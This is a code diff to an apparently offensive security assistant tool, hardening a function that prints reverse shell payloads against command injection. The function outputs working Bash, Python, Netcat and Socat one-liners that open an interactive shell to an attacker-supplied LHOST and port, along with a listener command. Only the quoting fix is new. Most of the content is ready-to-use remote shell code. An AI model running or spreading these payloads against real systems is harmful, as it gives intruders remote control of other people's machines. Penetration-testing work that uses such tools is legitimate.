@@ -1499,17 +1499,26 @@ class Agent:
         port = m.group(1) if m.group(1) else "4444"
         lhost = self.context.get("lhost", "0.0.0.0")
         self.context["lport"] = port
+
+        # Prevent command injection in payloads
+        lhost_safe = shlex.quote(str(lhost))
+        port_safe = shlex.quote(str(port))
+
+        # Safely construct Python payload with proper Python string escaping and shell escaping
+        py_code = f'import socket,subprocess,os;s=socket.socket();s.connect(({repr(str(lhost))},int({repr(str(port))})));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+        py_payload = f"python3 -c {shlex.quote(py_code)}"
+
         return (
             f"🐚 Reverse Shell Payloads (LHOST={lhost} LPORT={port})\n\n"
             f"  [Bash]\n"
-            f"    bash -i >& /dev/tcp/{lhost}/{port} 0>&1\n\n"
+            f"    bash -i >& /dev/tcp/{lhost_safe}/{port_safe} 0>&1\n\n"
             f"  [Python]\n"
-            f'    python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'\n\n'
+            f"    {py_payload}\n\n"
             f"  [Netcat]\n"
-            f"    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f\n\n"
+            f"    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost_safe} {port_safe} >/tmp/f\n\n"
             f"  [Socat]\n"
-            f"    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{port}\n\n"
-            f"  💡 Start listener: ! nc -nlvp {port}\n"
+            f"    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost_safe}:{port_safe}\n\n"
+            f"  💡 Start listener: ! nc -nlvp {port_safe}\n"
             f"  💡 Set your IP: set lhost <your-ip>"
         )
 
